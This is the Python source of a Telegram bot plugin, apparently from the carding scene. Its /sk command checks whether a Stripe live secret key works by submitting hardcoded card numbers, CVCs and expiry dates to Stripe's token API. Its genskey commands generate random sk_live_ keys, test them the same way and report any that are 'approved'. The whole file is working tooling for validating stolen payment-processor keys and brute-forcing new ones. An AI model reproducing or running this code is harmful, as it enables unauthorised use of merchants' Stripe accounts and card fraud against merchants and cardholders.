import requests
import random
import string
from pyrogram import Client, filters

def check_sk(key):
    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2022&card[cvc]=354'
    first = requests.post('https://api.stripe.com/v1/tokens', data=data, auth=(key, ' '))
    status = first.status_code
    f_json = first.json()
    if 'error' in f_json:
        if 'type' in f_json['error']:
            type = f_json['error']['type']
        else:
            type = ''
    else:
        type = ''
    if status == 200 or type == 'card_error':
        r_text, r_logo, r_respo = 'ᴠᴇʟɪᴅ ᴀᴘɪ ᴋᴇʏ', '✅', 'ᴠᴇʟɪᴅ ᴀᴘɪ ᴋᴇʏ'
    else:
        if 'error' in first.json():
            if 'code' in first.json()['error']:
                r_res = first.json()['error']['code'].replace('_', ' ').strip()
            else:
                r_res = 'ɪɴᴠᴀʟɪᴅ ᴀᴘɪ ᴋᴇʏ'
        else:
            r_res = 'ɪɴᴠᴀʟɪᴅ ᴀᴘɪ ᴋᴇʏ'

        r_text, r_logo, r_respo = 'ɪɴᴠᴀʟɪᴅ ᴀᴘɪ ᴋᴇʏ', '❌', r_res
    return r_text, r_logo, r_respo

@Client.on_message(filters.command("sk"))
async def sk_checker(_, message):
    data = message.text.split(maxsplit=1)
    if len(data) < 2 or not data[1].startswith('sk_live_'):
        return await message.reply("**ɢɪᴠᴇ ᴍᴇ sᴇɴsᴇɪ ᴏɴʟʏ sᴋ ᴋᴇʏ ᴏᴛʜᴇʀ ᴡɪsᴇ ɪ ᴄᴀɴ ɴᴏᴛ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴋᴇʏ.**")

    r_text, r_logo, r_respo = check_sk(data[1])

    if r_logo == '✅':
        text = f"""
        {r_text} {r_logo}\n\n**ᴋᴇʏ** - <code>{data[1]}</code>\n[{r_respo}]
        """
        await message.reply(text)
    else:
        text = f"""
        {r_text} ❌\n\n**ᴋᴇʏ** - <code>{data[1]}</code>\n[{r_respo}]
        """
        await message.reply(text)

@Client.on_message(filters.command("genskey long"))
async def long_genskey(_, message):
    skkey = random.choice(['sk_live_51H', 'sk_live_51J']) + ''.join(random.choices(string.digits + string.ascii_letters, k=96))
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
        await message.reply(f"""
**ᴅᴇᴄᴀʟɪɴᴇᴅ ❌**

**ᴋᴇʏ** - `{skkey}`
""")
    else:
        await message.reply(f"""
**ᴀᴘᴘʀᴏᴠᴇᴅ ✅**

**ᴋᴇʏ** - `{skkey}`        
""")

@Client.on_message(filters.command("genskey short"))
async def short_genskey(_, message):  # Changed function name to avoid conflict
    skkey = "sk_live_" + ''.join(random.choices(string.digits + string.ascii_letters, k=24))
    pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
    if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
        await message.reply(f"""
**ᴅᴇᴄᴀʟɪɴᴇᴅ ❌**

**ᴋᴇʏ** - `{skkey}`     
""")
    else:
        await message.reply(f"""
**ᴀᴘᴘʀᴏᴠᴇᴅ ✅**

**ᴋᴇʏ** - `{skkey}`        
""")
                                                               
